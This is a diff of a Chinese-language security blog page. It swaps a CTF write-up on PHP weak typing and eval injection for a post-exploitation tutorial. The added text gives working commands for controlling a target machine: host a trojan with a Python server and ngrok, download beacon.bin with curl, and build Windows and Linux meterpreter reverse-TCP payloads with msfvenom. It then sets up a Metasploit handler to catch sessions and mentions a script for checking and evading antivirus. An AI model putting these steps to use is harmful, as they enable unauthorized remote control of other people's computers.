@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF-PHP | WohCoOs</title>
+  <title>后渗透1% | WohCoOs</title>
   <meta name="keywords" content="">
-  <meta name="description" content="CTF-PHP | WohCoOs">
+  <meta name="description" content="后渗透1% | WohCoOs">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="如何控制目标机器 远程下载木马文件，这就需要一个服务器，通过请求服务器下载木马到目标机器 msfvenom制作木马 利用MSF攻击目标，设置监听 目标机器运行木马→MSF获得对方机器的session→控制目标机器  搭建本地服务器用于远程下载木马1.本地利用python搭建简单服务器python -m SimpleHTTPServer 8000 2.使用花生壳，ngrok，sunny_ngrok等">
 <meta property="og:type" content="article">
@@ -232,9 +232,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF-PHP" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-后渗透1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF-PHP</h1>
+        <h1 class="article-title">后渗透1%</h1>
     
     <div class="article-meta">
         
@@ -244,12 +244,12 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-06-11 11:08:18'>2021-06-10 08:31</time>
+            发布时间 : <time class="date" title='最后更新: 2021-06-16 23:37:30'>2021-06-16 23:27</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:923</span>
+        <span>字数:403</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -268,7 +268,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="toc-text">PHP弱类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99"><span class="toc-text">PHP转换规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">PHP文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8Bflag-php%E6%96%87%E4%BB%B6"><span class="toc-text">如何查看flag.php文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="toc-text">大体流程</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8"><span class="toc-text">如何控制目标机器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">搭建本地服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E4%BA%8E%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC"><span class="toc-text">用于远程下载木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Linux%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC%E5%91%BD%E4%BB%A4"><span class="toc-text">Windows&#x2F;Linux远程下载木马命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msfvenom%E5%88%B6%E4%BD%9C%E6%9C%A8%E9%A9%AC"><span class="toc-text">msfvenom制作木马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-text">生成木马：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%94%BB%E5%87%BB"><span class="toc-text">MSF攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F%E5%91%BD%E4%BB%A4"><span class="toc-text">Linux后台运行程序命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cna%E6%A3%80%E6%B5%8B%E6%9D%80%E8%BD%AF%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">cna检测杀软脚本使用</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -284,74 +284,44 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h2><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br>在php中有两种比较符号: <code>==</code>和<code>===</code></p>
-<ul>
-<li>== ：弱等于。在比较前会先把两种<strong>字符串类型转成相同</strong>的再进行比较。它不会比较<strong>变量类型</strong>，只比较值。</li>
-<li>=== ：强等于。在比较前会<strong>先判断两种字符串类型是否相同</strong>再进行比较，如果类型不同直接返回不相等。<strong>既比较值也比较类型</strong>。</li>
+        <h1 id="如何控制目标机器"><a href="#如何控制目标机器" class="headerlink" title="如何控制目标机器"></a>如何控制目标机器</h1><ul>
+<li>远程下载木马文件，这就需要一个服务器，通过请求服务器下载木马到目标机器</li>
+<li>msfvenom制作木马</li>
+<li>利用MSF攻击目标，设置监听</li>
+<li>目标机器运行木马→MSF获得对方机器的session→控制目标机器</li>
 </ul>
-<h2 id="PHP转换规则"><a href="#PHP转换规则" class="headerlink" title="PHP转换规则"></a>PHP转换规则</h2><ul>
-<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较</li>
-<li>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串或null，则转换为0</li>
-<li>eg:”admin”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）</li>
-<li>布尔值true和任意字符串都弱相等</li>
-</ul>
+<h2 id="搭建本地服务器"><a href="#搭建本地服务器" class="headerlink" title="搭建本地服务器"></a>搭建本地服务器</h2><h3 id="用于远程下载木马"><a href="#用于远程下载木马" class="headerlink" title="用于远程下载木马"></a>用于远程下载木马</h3><p>1.本地利用python搭建简单服务器<br><code>python -m SimpleHTTPServer 8000</code></p>
+<p>2.使用花生壳，ngrok，sunny_ngrok等内网穿透软件把自己在内网（局域网外无法访问的）的电脑变成外网服务器，可以提供远程下载服务。</p>
+<p>3.ngrok启动（Linux下）：<code>./ngrok http 8000</code>  </p>
 <ul>
-<li><pre><code class="php">var_dump(12==&quot;12&quot;)                                   //true
-var_dump(12==&quot;12aa&quot;)                               //true
-var_dump( &quot;admin&quot;==0)                               //true
-var_dump(false==&quot;&quot;==0==NULL)                        //true
-var_dump(true==&quot;hyuf&quot;)                              //true
-</code></pre>
+<li> 8000是本地端口</li>
+</ul>
+<h3 id="Windows-Linux远程下载木马命令"><a href="#Windows-Linux远程下载木马命令" class="headerlink" title="Windows/Linux远程下载木马命令"></a>Windows/Linux远程下载木马命令</h3><p><code>curl -o C:\Users\wohcoos\Desktop\beacon.bin http://ip:port/charlotte/beacon.bin</code></p>
+<h2 id="msfvenom制作木马"><a href="#msfvenom制作木马" class="headerlink" title="msfvenom制作木马"></a>msfvenom制作木马</h2><h3 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h3><ul>
+<li><p><code>Windows:msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ip(外网) LPORT=36491 -f raw &gt; /home/kali/</code></p>
+</li>
+<li><p><code>Linux:msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ip（外网） LPORT=36491 -f elf &gt; /home/kali/</code></p>
 </li>
 </ul>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul>
-<li><pre><code class="php">$num=$_GET[&#39;num&#39;];
-if(!is_numeric($num))
-&#123;
-echo $num;
-if($num==1)
-echo &#39;flag&#123;******&#125;&#39;;
-&#125; 
-</code></pre>
-</li>
-</ul>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>使用$定义一个变量<code>$num</code><br><code>is_numeric()</code> 函数用于检测变量是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE<br>flag在第二个条件中<br>在第一个if语句，如果输入为数字，则打印输入的数字，不打印flag<br>所以我们要执行第二个if语句，所以不能单纯输入数字，否则会执行第一个if语句<br>为满足判断条件2，根据上述转换规则，输入的数字为1+非数字字符则满足判断条件2打印出flag</p>
-<p><img src="/2021/06/10/CTF-PHP/1.png" alt="writeup"></p>
-<h2 id="PHP文件包含"><a href="#PHP文件包含" class="headerlink" title="PHP文件包含"></a>PHP文件包含</h2><ul>
-<li>web 应用采用 include()、include_once()、require()、require_once()等文件包含函数，并且需要包含的文件路径是通过<strong>用户传输参数</strong>的方式引入；</li>
-<li>用户能够<strong>控制</strong>包含文件的<strong>参数</strong>，被包含的文件可被当前页面访问；</li>
-</ul>
-<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><ul>
-<li><pre><code class="php">&lt;?php
-       include &quot;flag.php&quot;;
-       $a = @$_REQUEST[&#39;hello&#39;];
-       eval( &quot;var_dump($a);&quot;);
-       show_source(__FILE__);
-?&gt; 
+<h2 id="MSF攻击"><a href="#MSF攻击" class="headerlink" title="MSF攻击"></a>MSF攻击</h2><pre><code>use exploit/multi/handler  
 
+set payload windows/x64/meterpreter/reverse_tcp  
+
+set lhost 192.168.245.128  //这个就是你刚刚网站的填写的IP，内网穿透软件设置映射到本机的ip
+
+set lport 7758  //这个就是刚刚IP后面跟着的端口,内网穿透软件设置映射到本机的port
+
+exploit //运行，开始监听目标运行木马文件获得的session
 </code></pre>
-</li>
-</ul>
+<h2 id="Linux后台运行程序命令"><a href="#Linux后台运行程序命令" class="headerlink" title="Linux后台运行程序命令"></a>Linux后台运行程序命令</h2><p>目的就是方便</p>
 <ul>
-<li><p><code>Include（）</code>：包含并运行指定的文件，只有在程序执行到include时才包含文件，且当包含文件发生错误时，程序警告，但会继续执行。此时包含文件为flag.php</p>
-</li>
-<li><p><code>$_REQUEST[&quot;参数&quot;]</code>，此时参数为hello，此时用于提供给用户输入</p>
-</li>
-<li><p><code>eval() </code>函数可将字符串转换为代码执行，并返回一个或多个值，此时用于执行我们想要的命令</p>
-</li>
-<li><p><code>var_dump()</code>的功能是输出变量的信息，此时用于将运行结果输出给我们看</p>
-</li>
-<li><p><code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p>
-<h3 id="如何查看flag-php文件"><a href="#如何查看flag-php文件" class="headerlink" title="如何查看flag.php文件"></a>如何查看flag.php文件</h3><p>通过Linux的系统命令<code>cat flag.php</code>查看文件<br>通过php函数<code>show_source()</code>函数直接查看</p>
-<h3 id="大体流程"><a href="#大体流程" class="headerlink" title="大体流程"></a>大体流程</h3><ul>
-<li>使用php函数→用户输入→php函数转换→执行操作系统命令→获取flag</li>
-<li>php函数直接查看flag</li>
+<li><code>screen -S name </code>新建后台程序</li>
+<li><code>screen -ls</code> 后台程序清单</li>
+<li><code>screen -r</code> 恢复后台程序</li>
+<li><code>CTRL+a+d</code>  返回操作界面</li>
 </ul>
-<p>本题定义了一个变量<code>$a</code>，以及赋一个用户可控的参数<code>hello</code>给$a,我们利用可控参数hello找到我们的flag,传值过程(hello→a→eval）<code>eval</code>函数将用户的输入转化为代码执行（执行系统命令）从而通过执行系统命令查看我们的flag.php文件</p>
-<p>因为已知页面有<code>show_source()</code>函数，可以使用<code>show_source(&#39;flag.php&#39;)</code>直接查看<code>flag.php</code>页面</p>
-<p><img src="/2021/06/10/CTF-PHP/2.png" alt="writeup"></p>
-</li>
-</ul>
+<h3 id="cna检测杀软脚本使用"><a href="#cna检测杀软脚本使用" class="headerlink" title="cna检测杀软脚本使用"></a>cna检测杀软脚本使用</h3><p>防查杀</p>
+<p>命令:<code>AV_Query</code></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1694933467@qq.com </span>
